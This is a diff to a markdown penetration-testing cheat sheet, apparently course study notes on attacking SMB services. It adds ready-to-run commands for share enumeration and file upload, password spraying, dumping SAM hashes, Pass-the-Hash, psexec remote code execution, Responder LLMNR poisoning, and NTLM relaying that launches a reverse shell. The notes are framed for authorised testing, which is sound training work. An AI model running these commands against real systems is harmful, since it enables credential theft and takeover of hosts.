@@ -101,20 +101,32 @@ medusa -u <user> -P <list> -h <HOST> -M ftp     # brute (spraying usually better
 ```bash
 nmap -sV -sC -p139,445 <HOST>
 smbclient -N -L //<HOST>              # null session: list shares
-smbmap -H <HOST>                      # shares + perms
-rpcclient -U '%' <HOST>               # RPC enum
-enum4linux-ng.py -A -C <HOST>         # comprehensive
+smbmap -H <HOST>                      # shares + per-share perms (READ/WRITE/NO ACCESS)
+smbmap -H <HOST> -r notes             # browse recursively (-R deeper)
+smbmap -H <HOST> --download "notes\note.txt"       # pull a file
+smbmap -H <HOST> --upload test.txt "notes\test.txt"  # push a file
+rpcclient -U '%' <HOST>               # RPC enum → enumdomusers, querydominfo
+enum4linux-ng.py -A -C <HOST>         # comprehensive (wraps nmblookup/net/rpcclient/smbclient)
 ```
+SMB over NetBIOS = port 139 (or non-Windows); direct over TCP = 445. Samba = Unix/Linux SMB; MSRPC rides SMB named pipes.
 **Attacks (scope + approval):**
 ```bash
 crackmapexec smb <HOST> -u users.txt -p <pass> --local-auth    # spray
 crackmapexec smb <HOST> -u <u> -p <p> --loggedon-users         # who's logged on
 crackmapexec smb <HOST> -u <u> -p <p> --sam                    # dump local hashes
-crackmapexec smb <HOST> -u <u> -H <hash>                       # Pass-the-Hash
-impacket-psexec <u>:<p>@<HOST>                                 # RCE
-crackmapexec smb <HOST> -u <u> -p <p> -x 'whoami'              # run a command
+crackmapexec smb <HOST> -u <u> -H <NThash>                     # Pass-the-Hash (any Impacket tool/SMBMap/CME)
+impacket-psexec <u>:'<p>'@<HOST>                               # RCE → SYSTEM (uploads to ADMIN$, DCE/RPC SCM)
+crackmapexec smb <HOST> -u <u> -p <p> -x 'whoami' --exec-method smbexec   # run cmd (-X = PowerShell)
 ```
-- **Forced auth / hash capture:** `responder -I <iface>` captures NetNTLMv2 → crack with hashcat `-m 5600` (see module 10) or relay.
+- `--continue-on-success` keeps spraying after a hit (one password vs a big user list).
+- **Exec methods (Impacket):** `psexec` (RemComSvc on ADMIN$), `smbexec` (no RemComSvc; local SMB server catches output — works with no writable share), `atexec` (Task Scheduler). CME defaults to atexec → falls back to smbexec.
+- **Forced auth / hash capture:** `sudo responder -I <iface>` poisons LLMNR/NBT-NS/MDNS → captures NetNTLMv2 (logs in `/usr/share/responder/logs/`) → crack with hashcat `-m 5600` (module 10). Multiple hashes per account = NTLMv2 random challenge salt (same password).
+- **Relay** (if uncrackable; set `SMB = Off` in `/etc/responder/Responder.conf` first) — only vs hosts **without SMB signing required**:
+  ```bash
+  impacket-ntlmrelayx --no-http-server -smb2support -t <target>            # dumps SAM by default
+  impacket-ntlmrelayx --no-http-server -smb2support -t <target> -c '<cmd>' # or run a cmd (e.g. base64 PS reverse shell) → catch with nc
+  ```
+- **RPC post-auth** (config permitting): change a user's password, create a domain user / share (rpcclient).
 - **CVE-2020-0796 (SMBGhost)** — SMBv3.1.1 compression flaw, unauth RCE on Win10 1903/1909.
 
 ### SQL databases — MSSQL (1433/1434), MySQL (3306)
